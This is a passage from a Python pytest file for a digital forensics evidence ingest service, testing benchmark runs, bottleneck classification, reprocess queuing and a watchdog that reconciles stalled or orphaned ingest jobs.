def test_parallel_normalized_artifact_marks_processing_on_worker_ownership(monkeypatch: pytest.MonkeyPatch) -> None:
    updates: list[tuple[str, dict]] = []

    def fake_update_artifact_row_isolated(artifact_id: str, **fields) -> bool:
        updates.append((artifact_id, dict(fields)))
        return True

    monkeypatch.setattr("app.workers.tasks._update_artifact_row_isolated", fake_update_artifact_row_isolated)
    monkeypatch.setattr("app.workers.tasks.normalize_file", lambda *args, **kwargs: [])  # noqa: ARG005

    tracker: dict[str, dict] = {}
    result = _process_parallel_normalized_artifact(
        evidence_ref={"id": "evidence-1", "case_id": "case-1", "detected_host": None, "detected_user": None},
        artifact_info={
            "name": "Tasks.xml",
            "artifact_type": "scheduled_task",
            "source_path": "Windows/System32/Tasks/Tasks.xml",
            "parser": "scheduled_task_xml",
            "path": "/tmp/Tasks.xml",
        },
        artifact_id="artifact-1",
        ingest_batch_size=500,
        index_name="dfir-events-case-1",
        max_bulk_docs=1000,
        max_bulk_bytes=1_000_000,
        tracker=tracker,
        tracker_lock=threading.Lock(),
        detections_enabled=False,
    )

    assert updates[0] == ("artifact-1", {"status": "processing"})
    assert result["status"] == "completed"
    assert updates[-1] == ("artifact-1", {"status": "completed", "record_count": 0})


def test_running_benchmark_exposes_stalled_phase_warning() -> None:
    metadata = create_ingest_benchmark(
        {},
        benchmark_id="bench-stalled",
        evidence_id="evidence-1",
        case_id="case-1",
        run_id="run-1",
        mode="reprocess_previous_selection",
        profile="safe",
        label="baseline-safe",
    )
    stale_ts = (datetime.now(UTC) - timedelta(seconds=45)).replace(microsecond=0)
    metadata["ingest_benchmark_runs"][0].update(
        {
            "status": "running",
            "started_at": stale_ts.isoformat(),
            "last_progress_at": stale_ts.isoformat(),
            "current_action": "extracting_archive_batch",
            "phase_timings": [
                {
                    "phase": "extracting_selected",
                    "started_at": stale_ts.isoformat(),
                    "finished_at": None,
                    "duration_seconds": 45.0,
                    "records_read": 0,
                    "records_indexed": 0,
                    "artifacts_processed": 0,
                    "errors": [],
                }
            ],
        }
    )

    benchmark = get_ingest_benchmark(metadata, "bench-stalled")

    assert benchmark is not None
    assert benchmark["phase"] == "extracting_selected"
    assert benchmark["current_phase_stalled"] is True
    assert "No progress observed" in benchmark["stalled_phase_warning"]


def test_benchmark_skip_detections_skips_reconciliation_baseline() -> None:
    evidence = SimpleNamespace(
        case_id="case-1",
        id="evidence-1",
        metadata_json={},
    )
    calls = {"commit": 0, "refresh": 0}

    class _FakeSession:
        def commit(self):
            calls["commit"] += 1

        def refresh(self, _obj):
            calls["refresh"] += 1

    metadata = {
        "benchmark_request": {
            "benchmark_id": "bench-1",
            "run_id": "run-1",
            "skip_detections": True,
            "skip_rules": True,
        },
        "reconciliation_baseline_pending": {
            "requested_at": datetime.now(UTC).isoformat(),
        },
    }

    result = _run_pending_reconciliation_baseline(_FakeSession(), evidence, metadata)

    assert result["reconciliation_baseline_skipped"]["skipped"] is True
    assert result["reconciliation_baseline_skipped"]["reason"] == "benchmark_skip_detections"
    assert "reconciliation_baseline_pending" not in result
    assert calls["commit"] == 1
    assert calls["refresh"] == 1


def test_benchmark_skip_detections_cleanup_skips_detection_query(monkeypatch: pytest.MonkeyPatch) -> None:
    evidence = SimpleNamespace(
        case_id="case-1",
        id="evidence-1",
        metadata_json={},
    )
    delete_calls: list[tuple[str, str]] = []
    monkeypatch.setattr("app.workers.tasks.delete_events_by_evidence", lambda evidence_id, case_id: delete_calls.append((evidence_id, case_id)))

    class _FakeQuery:
        def filter(self, *_args, **_kwargs):
            raise AssertionError("DetectionResult cleanup query should be skipped")

    class _FakeSession:
        def query(self, _model):
            return _FakeQuery()

        def commit(self):
            return None

        def refresh(self, _obj):
            return None

    metadata = {
        "reprocess_cleanup_pending": {
            "delete_events": True,
            "stale_detection_statuses": [],
            "delete_artifacts": False,
            "reset_extracted_dir": False,
            "reset_staging_dir": False,
            "detections_cleanup_skipped": True,
            "detection_cleanup_reason": "benchmark_skip_detections",
        }
    }

    result = _run_pending_reprocess_cleanup(_FakeSession(), evidence, metadata)

    assert delete_calls == [("evidence-1", "case-1")]
    assert result["reprocess_cleanup_report"]["detections_cleanup_skipped"] is True
    assert result["reprocess_cleanup_report"]["detection_cleanup_reason"] == "benchmark_skip_detections"
    assert "reprocess_cleanup_pending" not in result


def test_benchmark_bottleneck_classifier_identifies_materialization() -> None:
    report = classify_benchmark_bottleneck(
        {
            "total_duration_seconds": 120,
            "time_to_first_event_indexed": 40,
            "time_to_first_parse_start": 0,
            "effective_parallelism": 2,
            "resource_samples": [],
            "metadata_opensearch_delta": 0,
            "by_parser": {},
            "phase_timings": [],
        }
    )

    assert report["bottleneck"] == "materialization"


def test_benchmark_bottleneck_classifier_identifies_single_slow_artifact() -> None:
    report = classify_benchmark_bottleneck(
        {
            "total_duration_seconds": 100,
            "time_to_first_event_indexed": 2,
            "time_to_first_parse_start": 1,
            "effective_parallelism": 2,
            "resource_samples": [],
            "metadata_opensearch_delta": 0,
            "phase_timings": [],
            "by_parser": {
                "evtx_raw": {
                    "top_slow_artifacts": [
                        {"artifact_name": "slow.evtx", "duration_seconds": 45},
                    ]
                }
            },
        }
    )

    assert report["bottleneck"] == "single_slow_artifact"


def test_compare_ingest_benchmarks_computes_speedup() -> None:
    comparison = compare_ingest_benchmarks(
        {
            "profile": "safe",
            "total_duration_seconds": 200,
            "records_per_sec": 100,
            "artifacts_per_sec": 1,
            "time_to_first_event_indexed": 20,
            "problematic_count": 1,
            "effective_parallelism": 1,
            "metadata_opensearch_delta": 0,
            "bottleneck_report": {"bottleneck": "materialization"},
        },
        {
            "profile": "performance",
            "total_duration_seconds": 100,
            "records_per_sec": 220,
            "artifacts_per_sec": 2,
            "time_to_first_event_indexed": 10,
            "problematic_count": 1,
            "effective_parallelism": 2,
            "metadata_opensearch_delta": 0,
            "bottleneck_report": {"bottleneck": "parsing"},
        },
    )

    assert comparison["speedup_duration"] == 2.0
    assert comparison["speedup_records_per_sec"] == 2.2
    assert comparison["profile_recommendation"] == "performance"


def test_compare_ingest_benchmarks_ignores_infrastructure_blocked_runs() -> None:
    comparison = compare_ingest_benchmarks(
        {
            "profile": "balanced",
            "status": "failed",
            "total_duration_seconds": 50,
            "records_per_sec": 0,
            "artifacts_per_sec": 0,
            "problematic_count": 0,
            "effective_parallelism": 1,
            "metadata_opensearch_delta": 0,
            "bottleneck_report": {"bottleneck": "infrastructure_blocked"},
        },
        {
            "profile": "performance",
            "status": "failed",
            "total_duration_seconds": 60,
            "records_per_sec": 0,
            "artifacts_per_sec": 0,
            "problematic_count": 0,
            "effective_parallelism": 2,
            "metadata_opensearch_delta": 0,
            "bottleneck_report": {"bottleneck": "single_slow_artifact"},
        },
    )

    assert comparison["measurement_reliable"] is False
    assert comparison["profile_recommendation"] is None
    assert "OpenSearch infrastructure state" in comparison["reason"]


def test_benchmark_endpoint_returns_run_id(monkeypatch: pytest.MonkeyPatch) -> None:
    captured: dict[str, object] = {}

    def _queue(evidence_id, payload, db, benchmark_request=None):
        captured["benchmark_request"] = dict(benchmark_request or {})
        return {
            "accepted": True,
            "evidence_id": evidence_id,
            "run_id": "ingest-run-1",
            "status": "queued",
            "mode": benchmark_mode_to_reprocess_mode((benchmark_request or {}).get("mode")),
        }

    monkeypatch.setattr(
        "app.api.routes_evidence._queue_reprocess_request",
        _queue,
    )

    result = run_evidence_benchmark(
        "evidence-1",
        BenchmarkEvidenceRequest(
            mode="reprocess_previous_selection",
            profile="performance",
            label="perf",
            autopilot=True,
            max_attempts=2,
            no_progress_timeout_seconds=600,
            heartbeat_timeout_seconds=300,
        ),
        db=None,  # type: ignore[arg-type]
    )

    assert result["run_id"] == "ingest-run-1"
    assert result["profile"] == "performance"
    assert captured["benchmark_request"]["skip_detections"] is True
    assert captured["benchmark_request"]["skip_rules"] is True
    assert captured["benchmark_request"]["autopilot"] is True
    assert captured["benchmark_request"]["max_attempts"] == 2


def test_queue_reprocess_benchmark_fails_fast_when_opensearch_preflight_is_blocked(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("app.api.routes_evidence._ensure_rebuilt_ingest_plan", lambda db, item: item)
    monkeypatch.setattr("app.api.routes_evidence._normalize_reprocess_mode", lambda value, has_previous_plan: "previous_selection")
    monkeypatch.setattr("app.api.routes_evidence._is_raw_collection_with_discovery", lambda item, metadata=None: False)
    monkeypatch.setattr("app.api.routes_evidence.build_plan", lambda *args, **kwargs: {"selected_by_artifact_type": {}, "selected_by_parser": {}, "selected_candidates": []})
    monkeypatch.setattr("app.api.routes_evidence.persist_requested_plan", lambda metadata, requested_plan: {**dict(metadata or {}), "requested_ingest_plan": requested_plan})
    monkeypatch.setattr("app.api.routes_evidence._capture_reingest_baseline", lambda *args, **kwargs: {})
    monkeypatch.setattr("app.api.routes_evidence._write_initial_manifest", lambda item: None)
    monkeypatch.setattr("app.api.routes_evidence.log_activity", lambda *args, **kwargs: None)
    monkeypatch.setattr(
        "app.api.routes_evidence.enqueue_ingest",
        lambda evidence_id: (_ for _ in ()).throw(
            OpenSearchIngestBlockedError(
                "OpenSearch is not writable or cannot create indices. Ingest has not started.",
                details={"cluster_create_index_blocked": True},
            )
        ),
    )

    evidence = SimpleNamespace(
        id="evidence-1",
        case_id="case-1",
        original_filename="blocked.zip",
        stored_path="/tmp/blocked.zip",
        original_path="/tmp/blocked.zip",
        sha256="abc",
        size_bytes=123,
        file_count=1,
        ingest_status=IngestStatus.pending,
        metadata_json={},
        error_log={},
        evidence_type="generic",
        source_tool=None,
        processed_at=None,
    )

    class _FakeDb:
        def get(self, _model, _evidence_id):
            return evidence

        def commit(self):
            return None

        def refresh(self, _item):
            return None

    with pytest.raises(Exception) as exc_info:
        _queue_reprocess_request(
            "evidence-1",
            SimpleNamespace(mode="previous_selection", selected_candidate_ids=[], parser_options={}, preserve_analyst_state=False, explicit_confirm=False),
            _FakeDb(),
            benchmark_request={"benchmark_id": "bench-1", "mode": "reprocess_previous_selection", "profile": "performance"},
        )

    exc = exc_info.value
    assert getattr(exc, "status_code", None) == 503
    assert "OpenSearch is not writable or cannot create indices" in str(exc.detail)
    assert evidence.ingest_status == IngestStatus.failed
    assert evidence.metadata_json["current_ingest_run_id"] is None
    benchmark = get_ingest_benchmark(evidence.metadata_json, "bench-1")
    assert benchmark is not None
    assert benchmark["status"] == "failed"
    assert benchmark["watchdog_status"] == "infrastructure_blocked"


def test_benchmark_endpoint_disables_preserve_analyst_state_when_skipping_detections(monkeypatch: pytest.MonkeyPatch) -> None:
    captured: dict[str, object] = {}

    def _queue(evidence_id, payload, db, benchmark_request=None):
        captured["payload"] = payload
        return {
            "accepted": True,
            "evidence_id": evidence_id,
            "run_id": "ingest-run-2",
            "status": "queued",
            "mode": benchmark_mode_to_reprocess_mode((benchmark_request or {}).get("mode")),
        }

    monkeypatch.setattr("app.api.routes_evidence._queue_reprocess_request", _queue)

    run_evidence_benchmark(
        "evidence-1",
        BenchmarkEvidenceRequest(mode="reprocess_previous_selection", profile="performance", label="perf", skip_detections=True, skip_rules=True),
        db=None,  # type: ignore[arg-type]
    )

    assert captured["payload"].preserve_analyst_state is False


def test_queue_reprocess_usable_search_disables_analyst_state_and_detection_cleanup(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("app.api.routes_evidence._ensure_rebuilt_ingest_plan", lambda db, item: item)
    monkeypatch.setattr("app.api.routes_evidence._is_raw_collection_with_discovery", lambda item, metadata: False)
    monkeypatch.setattr(
        "app.api.routes_evidence.build_plan",
        lambda item, existing_metadata, discovery_mode, selected_candidate_ids, disabled_candidate_ids, parser_options: {
            "selected_by_artifact_type": {"windows_event": 1},
            "selected_by_parser": {"evtx_raw": 1},
            "selected_candidates": [],
            "disabled_candidates": [],
            "discovery_mode": discovery_mode,
            "parser_options": parser_options,
        },
    )
    monkeypatch.setattr("app.api.routes_evidence._capture_reingest_baseline", lambda *args, **kwargs: {})
    monkeypatch.setattr("app.api.routes_evidence._write_initial_manifest", lambda evidence: None)
    monkeypatch.setattr("app.api.routes_evidence.log_activity", lambda *args, **kwargs: None)
    monkeypatch.setattr("app.api.routes_evidence.enqueue_ingest", lambda evidence_id: "job-1")

    evidence = SimpleNamespace(
        id="evidence-1",
        case_id="case-1",
        original_filename="test.zip",
        stored_path="/tmp/test.zip",
        sha256=None,
        ingest_status=IngestStatus.completed,
        metadata_json={"ingest_runs": [{"run_id": "old-run"}]},
        error_log={},
        evidence_type="generic",
        source_tool=None,
        processed_at=None,
    )

    class _FakeDb:
        def get(self, _model, _evidence_id):
            return evidence

        def commit(self):
            return None

        def refresh(self, _item):
            return None

    result = _queue_reprocess_request(
        "evidence-1",
        SimpleNamespace(
            mode="previous_selection",
            selected_candidate_ids=[],
            parser_options={},
            preserve_analyst_state=True,
            explicit_confirm=False,
            ingest_mode="usable_search",
        ),
        _FakeDb(),
        benchmark_request=None,
    )

    assert result["accepted"] is True
    assert evidence.metadata_json["ingest_mode"] == "usable_search"
    assert "rules" in evidence.metadata_json["skipped_features"]
    assert evidence.metadata_json["reprocess_cleanup_pending"]["detections_cleanup_skipped"] is True
    assert evidence.metadata_json["reprocess_cleanup_pending"]["detection_cleanup_reason"] == "usable_search_skip_detections"
    assert evidence.metadata_json["reprocess_cleanup_pending"]["stale_detection_statuses"] == []
    assert "reconciliation_baseline_pending" not in evidence.metadata_json


def test_queue_reprocess_benchmark_conflicts_with_active_ingest(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("app.api.routes_evidence._ensure_rebuilt_ingest_plan", lambda db, item: item)
    evidence = SimpleNamespace(
        id="evidence-1",
        case_id="case-1",
        ingest_status=IngestStatus.processing,
        metadata_json=create_ingest_benchmark(
            start_ingest_run(
                {},
                run_id="ingest-active",
                run_type="reprocess",
                mode="previous_selection",
                status="running",
                selected_by_artifact_type={"windows_event": 1},
                selected_by_parser={"evtx_raw": 1},
            ),
            benchmark_id="bench-active",
            evidence_id="evidence-1",
            case_id="case-1",
            run_id="ingest-active",
            mode="reprocess_previous_selection",
            profile="performance",
            label="active",
            status="running",
        ),
        evidence_type="raw_collection",
        source_tool="raw_collection",
    )

    class _FakeDb:
        def get(self, _model, _evidence_id):
            return evidence

    with pytest.raises(Exception) as exc_info:
        _queue_reprocess_request(
            "evidence-1",
            SimpleNamespace(mode="previous_selection", selected_candidate_ids=[], parser_options={}, preserve_analyst_state=False, explicit_confirm=False),
            _FakeDb(),
            benchmark_request={"benchmark_id": "bench-new", "mode": "reprocess_previous_selection", "profile": "performance"},
        )

    exc = exc_info.value
    assert getattr(exc, "status_code", None) == 409
    assert exc.detail["error"] == "active_ingest_exists"
    assert exc.detail["active_run_id"] == "ingest-active"
    assert exc.detail["active_benchmark_id"] == "bench-active"
    assert get_ingest_benchmark(evidence.metadata_json, "bench-new") is None
    assert get_ingest_benchmark_by_run_id(evidence.metadata_json, "ingest-active")["benchmark_id"] == "bench-active"


def test_watchdog_reconciles_orphaned_benchmark_run(monkeypatch: pytest.MonkeyPatch) -> None:
    engine = create_engine("sqlite:///:memory:", future=True)
    Base.metadata.create_all(bind=engine)
    Session = sessionmaker(bind=engine, autoflush=False, autocommit=False, expire_on_commit=False, future=True)
    db = Session()
    case = Case(id="11111111-1111-4111-a111-111111111111", name="Watchdog", status=CaseStatus.open)
    evidence = Evidence(
        id="22222222-2222-4222-a222-222222222222",
        case_id=case.id,
        original_filename="watchdog.zip",
        stored_path="/tmp/watchdog.zip",
        original_path="/tmp/watchdog.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="abc",
        size_bytes=123,
        file_count=2,
        ingest_status=IngestStatus.processing,
        storage_mode=EvidenceStorageMode.uploaded,
        metadata_json={},
        error_log={},
    )
    metadata = start_ingest_run(
        {},
        run_id="ingest-watchdog-1",
        run_type="reprocess",
        mode="previous_selection",
        status="running",
        selected_by_artifact_type={"windows_event": 2},
        selected_by_parser={"evtx_raw": 2},
    )
    metadata = upsert_ingest_run(
        metadata,
        "ingest-watchdog-1",
        {
            "status": "processing",
            "phase": "parsing",
            "started_at": "2026-05-25T06:08:06+00:00",
            "heartbeat_at": "2026-05-25T07:08:58+00:00",
            "records_read": 400,
            "records_indexed": 120,
            "events_indexed": 120,
        },
    )
    metadata = create_ingest_benchmark(
        metadata,
        benchmark_id="bench-watchdog-1",
        evidence_id=evidence.id,
        case_id=case.id,
        run_id="ingest-watchdog-1",
        mode="reprocess_previous_selection",
        profile="performance",
        status="running",
        benchmark_options={**DEFAULT_AUTOPILOT_POLICY, "autopilot": True, "allow_retry_benchmark": False, "max_duration_seconds": 999999},
    )
    metadata = upsert_ingest_benchmark(
        metadata,
        "bench-watchdog-1",
        {
            "status": "running",
            "run_id": "ingest-watchdog-1",
            "started_at": "2026-05-25T06:08:06+00:00",
            "last_progress_at": "2026-05-25T07:08:58+00:00",
            "selected_total": 2,
        },
    )
    evidence.metadata_json = metadata
    db.add(case)
    db.add(evidence)
    db.add(
        Artifact(
            id="33333333-3333-4333-a333-333333333333",
            case_id=case.id,
            evidence_id=evidence.id,
            name="EVTX raw - A.evtx",
            artifact_type="windows_event",
            source_path="A.evtx",
            parser="evtx_raw",
            record_count=0,
            status="processing",
        )
    )
    db.add(
        Artifact(
            id="44444444-4444-4444-a444-444444444444",
            case_id=case.id,
            evidence_id=evidence.id,
            name="EVTX raw - B.evtx",
            artifact_type="windows_event",
            source_path="B.evtx",
            parser="evtx_raw",
            record_count=0,
            status="completed",
        )
    )
    db.commit()

    monkeypatch.setattr("app.services.job_watchdog._find_ingest_job", lambda _evidence_id: {"exists": False, "status": "missing", "job_id": None})
    monkeypatch.setattr("app.services.job_watchdog.write_manifest", lambda *args, **kwargs: None)

    benchmark = run_benchmark_watchdog(db, evidence.id, "bench-watchdog-1")
    db.refresh(evidence)

    assert benchmark["status"] == "cancelled"
    assert benchmark["watchdog_status"] == "orphaned_reconciled"
    assert evidence.ingest_status == IngestStatus.completed_with_errors
    assert evidence.metadata_json.get("current_ingest_run_id") is None
    statuses = {artifact.id: artifact.status for artifact in db.query(Artifact).filter(Artifact.evidence_id == evidence.id).all()}
    assert statuses["33333333-3333-4333-a333-333333333333"] == "cancelled"
    assert statuses["44444444-4444-4444-a444-444444444444"] == "completed"
    assert benchmark["watchdog_actions"][-1]["action"] == "reconcile_orphaned_run"


def test_watchdog_retry_queues_new_attempt_without_ghost_id(monkeypatch: pytest.MonkeyPatch) -> None:
    engine = create_engine("sqlite:///:memory:", future=True)
    Base.metadata.create_all(bind=engine)
    Session = sessionmaker(bind=engine, autoflush=False, autocommit=False, expire_on_commit=False, future=True)
    db = Session()
    case = Case(id="55555555-5555-4555-a555-555555555555", name="Watchdog", status=CaseStatus.open)
    evidence = Evidence(
        id="66666666-6666-4666-a666-666666666666",
        case_id=case.id,
        original_filename="watchdog.zip",
        stored_path="/tmp/watchdog.zip",
        original_path="/tmp/watchdog.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="abc",
        size_bytes=123,
        file_count=2,
        ingest_status=IngestStatus.processing,
        storage_mode=EvidenceStorageMode.uploaded,
        metadata_json={},
        error_log={},
    )
    metadata = start_ingest_run(
        {},
        run_id="ingest-watchdog-2",
        run_type="reprocess",
        mode="previous_selection",
        status="running",
        selected_by_artifact_type={"windows_event": 2},
        selected_by_parser={"evtx_raw": 2},
    )
    metadata["requested_ingest_plan"] = {
        "selected_by_artifact_type": {"windows_event": 2},
        "selected_by_parser": {"evtx_raw": 2},
        "selected_candidates": [{"id": "cand-1"}, {"id": "cand-2"}],
    }
    metadata = upsert_ingest_run(
        metadata,
        "ingest-watchdog-2",
        {
            "status": "processing",
            "phase": "parsing",
            "started_at": "2026-05-25T06:08:06+00:00",
            "heartbeat_at": "2026-05-25T07:08:58+00:00",
        },
    )
    metadata = create_ingest_benchmark(
        metadata,
        benchmark_id="bench-watchdog-2",
        evidence_id=evidence.id,
        case_id=case.id,
        run_id="ingest-watchdog-2",
        mode="reprocess_previous_selection",
        profile="performance",
        status="running",
        benchmark_options={**DEFAULT_AUTOPILOT_POLICY, "autopilot": True, "max_attempts": 2, "max_duration_seconds": 999999},
    )
    metadata = upsert_ingest_benchmark(
        metadata,
        "bench-watchdog-2",
        {
            "status": "running",
            "run_id": "ingest-watchdog-2",
            "started_at": "2026-05-25T06:08:06+00:00",
            "last_progress_at": "2026-05-25T07:08:58+00:00",
            "selected_total": 2,
        },
    )
    evidence.metadata_json = metadata
    db.add(case)
    db.add(evidence)
    db.add(
        Artifact(
            id="77777777-7777-4777-a777-777777777777",
            case_id=case.id,
            evidence_id=evidence.id,
            name="EVTX raw - A.evtx",
            artifact_type="windows_event",
            source_path="A.evtx",
            parser="evtx_raw",
            record_count=0,
            status="processing",
        )
    )
    db.commit()

    enqueued: list[str] = []
    monkeypatch.setattr("app.services.job_watchdog._find_ingest_job", lambda _evidence_id: {"exists": False, "status": "missing", "job_id": None})
    monkeypatch.setattr("app.services.job_watchdog.write_manifest", lambda *args, **kwargs: None)
    monkeypatch.setattr("app.services.job_watchdog.enqueue_ingest", lambda evidence_id: enqueued.append(evidence_id) or "job-1")

    benchmark = run_benchmark_watchdog(db, evidence.id, "bench-watchdog-2")
    db.refresh(evidence)
    refreshed = get_ingest_benchmark(evidence.metadata_json or {}, "bench-watchdog-2")

    assert enqueued == [evidence.id]
    assert benchmark["benchmark_id"] == "bench-watchdog-2"
    assert refreshed["status"] == "queued"
    assert refreshed["current_attempt"] == 2
    assert len(refreshed["attempts"]) == 2
    assert refreshed["attempts"][-1]["run_id"] == refreshed["run_id"]
    assert refreshed["watchdog_status"] == "retrying"
    assert evidence.metadata_json.get("current_ingest_run_id") == refreshed["run_id"]


def test_watchdog_stops_after_max_attempts(monkeypatch: pytest.MonkeyPatch) -> None:
    engine = create_engine("sqlite:///:memory:", future=True)
    Base.metadata.create_all(bind=engine)
    Session = sessionmaker(bind=engine, autoflush=False, autocommit=False, expire_on_commit=False, future=True)
    db = Session()
    case = Case(id="88888888-8888-4888-a888-888888888888", name="Watchdog", status=CaseStatus.open)
    evidence = Evidence(
        id="99999999-9999-4999-a999-999999999999",
        case_id=case.id,
        original_filename="watchdog.zip",
        stored_path="/tmp/watchdog.zip",
        original_path="/tmp/watchdog.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="abc",
        size_bytes=123,
        file_count=2,
        ingest_status=IngestStatus.processing,
        storage_mode=EvidenceStorageMode.uploaded,
        metadata_json={},
        error_log={},
    )
    metadata = start_ingest_run(
        {},
        run_id="ingest-watchdog-3",
        run_type="reprocess",
        mode="previous_selection",
        status="running",
        selected_by_artifact_type={"windows_event": 2},
        selected_by_parser={"evtx_raw": 2},
    )
    metadata = create_ingest_benchmark(
        metadata,
        benchmark_id="bench-watchdog-3",
        evidence_id=evidence.id,
        case_id=case.id,
        run_id="ingest-watchdog-3",
        mode="reprocess_previous_selection",
        profile="performance",
        status="running",
        benchmark_options={**DEFAULT_AUTOPILOT_POLICY, "autopilot": True, "max_attempts": 1, "max_duration_seconds": 999999},
    )
    metadata = upsert_ingest_benchmark(
        metadata,
        "bench-watchdog-3",
        {
            "status": "running",
            "run_id": "ingest-watchdog-3",
            "started_at": "2026-05-25T06:08:06+00:00",
            "last_progress_at": "2026-05-25T07:08:58+00:00",
            "selected_total": 2,
        },
    )
    metadata = upsert_ingest_run(
        metadata,
        "ingest-watchdog-3",
        {
            "status": "processing",
            "phase": "parsing",
            "started_at": "2026-05-25T06:08:06+00:00",
            "heartbeat_at": "2026-05-25T07:08:58+00:00",
        },
    )
    evidence.metadata_json = metadata
    db.add(case)
    db.add(evidence)
    db.add(
        Artifact(
            id="aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
            case_id=case.id,
            evidence_id=evidence.id,
            name="EVTX raw - A.evtx",
            artifact_type="windows_event",
            source_path="A.evtx",
            parser="evtx_raw",
            record_count=0,
            status="processing",
        )
    )
    db.commit()

    monkeypatch.setattr("app.services.job_watchdog._find_ingest_job", lambda _evidence_id: {"exists": False, "status": "missing", "job_id": None})
    monkeypatch.setattr("app.services.job_watchdog.write_manifest", lambda *args, **kwargs: None)
    monkeypatch.setattr("app.services.job_watchdog.enqueue_ingest", lambda _evidence_id: pytest.fail("enqueue_ingest should not be called"))

    benchmark = run_benchmark_watchdog(db, evidence.id, "bench-watchdog-3")
    refreshed = get_ingest_benchmark(evidence.metadata_json or {}, "bench-watchdog-3")

    assert benchmark["status"] == "failed"
    assert refreshed["watchdog_status"] == "stopped"
    assert refreshed["final_recommendation"] == "Autopilot stopped after max_attempts."


def test_generate_watchdog_report_returns_attempts_and_actions() -> None:
    report = generate_watchdog_report(
        {
            "benchmark_id": "bench-1",
            "run_id": "run-1",
            "watchdog_status": "retrying",
            "last_watchdog_check_at": "2026-05-25T07:00:00Z",
            "autopilot_enabled": True,
            "current_attempt": 2,
            "attempts": [{"attempt_number": 1}, {"attempt_number": 2}],
            "watchdog_actions": [{"action": "retry_benchmark_attempt"}],
            "final_recommendation": "Retrying benchmark attempt 2/2.",
        }
    )

    assert report["benchmark_id"] == "bench-1"
    assert report["watchdog_status"] == "retrying"
    assert len(report["attempts"]) == 2
    assert report["actions"][0]["action"] == "retry_benchmark_attempt"


def test_watchdog_get_preserves_terminal_reconciled_status(monkeypatch: pytest.MonkeyPatch) -> None:
    engine = create_engine("sqlite:///:memory:", future=True)
    Base.metadata.create_all(bind=engine)
    Session = sessionmaker(bind=engine, autoflush=False, autocommit=False, expire_on_commit=False, future=True)
    db = Session()
    case = Case(id="bbbbbbbb-bbbb-4bbb-abbb-bbbbbbbbbbbb", name="Watchdog", status=CaseStatus.open)
    evidence = Evidence(
        id="cccccccc-cccc-4ccc-accc-cccccccccccc",
        case_id=case.id,
        original_filename="watchdog.zip",
        stored_path="/tmp/watchdog.zip",
        original_path="/tmp/watchdog.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="abc",
        size_bytes=123,
        file_count=1,
        ingest_status=IngestStatus.completed_with_errors,
        storage_mode=EvidenceStorageMode.uploaded,
        metadata_json={},
        error_log={},
    )
    metadata = start_ingest_run(
        {},
        run_id="ingest-watchdog-4",
        run_type="reprocess",
        mode="previous_selection",
        status="cancelled",
        selected_by_artifact_type={"windows_event": 1},
        selected_by_parser={"evtx_raw": 1},
    )
    metadata = upsert_ingest_run(
        metadata,
        "ingest-watchdog-4",
        {
            "status": "cancelled",
            "phase": "cancelled",
            "started_at": "2026-05-25T06:08:06+00:00",
            "finished_at": "2026-05-25T07:08:58+00:00",
            "heartbeat_at": "2026-05-25T07:08:58+00:00",
        },
    )
    metadata = create_ingest_benchmark(
        metadata,
        benchmark_id="bench-watchdog-4",
        evidence_id=evidence.id,
        case_id=case.id,
        run_id="ingest-watchdog-4",
        mode="reprocess_previous_selection",
        profile="performance",
        status="cancelled",
        benchmark_options={**DEFAULT_AUTOPILOT_POLICY, "autopilot": True, "allow_retry_benchmark": False},
    )
    metadata = upsert_ingest_benchmark(
        metadata,
        "bench-watchdog-4",
        {
            "status": "cancelled",
            "run_id": "ingest-watchdog-4",
            "watchdog_status": "healthy",
            "final_recommendation": "The benchmark run became orphaned and was automatically reconciled.",
            "watchdog_actions": [{"action": "reconcile_orphaned_run"}],
        },
    )
    evidence.metadata_json = metadata
    db.add(case)
    db.add(evidence)
    db.commit()

    monkeypatch.setattr("app.services.job_watchdog._find_ingest_job", lambda _evidence_id: {"exists": False, "status": "missing", "job_id": None})

    benchmark = run_benchmark_watchdog(db, evidence.id, "bench-watchdog-4")

    assert benchmark["status"] == "cancelled"
    assert benchmark["watchdog_status"] == "orphaned_reconciled"
    assert benchmark["watchdog_actions"] == [{"action": "reconcile_orphaned_run"}]


def test_watchdog_reconciles_run_exceeding_max_duration(monkeypatch: pytest.MonkeyPatch) -> None:
    engine = create_engine("sqlite:///:memory:", future=True)
    Base.metadata.create_all(bind=engine)
    Session = sessionmaker(bind=engine, autoflush=False, autocommit=False, expire_on_commit=False, future=True)
    db = Session()
    case = Case(id="dddddddd-dddd-4ddd-addd-dddddddddddd", name="Watchdog", status=CaseStatus.open)
    evidence = Evidence(
        id="eeeeeeee-eeee-4eee-aeee-eeeeeeeeeeee",
        case_id=case.id,
        original_filename="watchdog.zip",
        stored_path="/tmp/watchdog.zip",
        original_path="/tmp/watchdog.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="abc",
        size_bytes=123,
        file_count=1,
        ingest_status=IngestStatus.processing,
        storage_mode=EvidenceStorageMode.uploaded,
        metadata_json={},
        error_log={},
    )
    metadata = start_ingest_run(
        {},
        run_id="ingest-watchdog-5",
        run_type="reprocess",
        mode="previous_selection",
        status="running",
        selected_by_artifact_type={"windows_event": 1},
        selected_by_parser={"evtx_raw": 1},
    )
    metadata = upsert_ingest_run(
        metadata,
        "ingest-watchdog-5",
        {
            "status": "processing",
            "phase": "extracting_selected",
            "started_at": "2026-05-25T06:08:06+00:00",
            "heartbeat_at": "2026-05-25T07:08:58+00:00",
        },
    )
    metadata = create_ingest_benchmark(
        metadata,
        benchmark_id="bench-watchdog-5",
        evidence_id=evidence.id,
        case_id=case.id,
        run_id="ingest-watchdog-5",
        mode="reprocess_previous_selection",
        profile="balanced",
        status="running",
        benchmark_options={**DEFAULT_AUTOPILOT_POLICY, "autopilot": True, "max_duration_seconds": 60, "allow_retry_benchmark": True},
    )
    metadata = upsert_ingest_benchmark(
        metadata,
        "bench-watchdog-5",
        {
            "status": "running",
            "run_id": "ingest-watchdog-5",
            "started_at": "2026-05-25T06:08:06+00:00",
            "last_progress_at": "2026-05-25T10:00:00+00:00",
            "selected_total": 1,
            "current_action": "skipping_existing",
        },
    )
    evidence.metadata_json = metadata
    db.add(case)
    db.add(evidence)
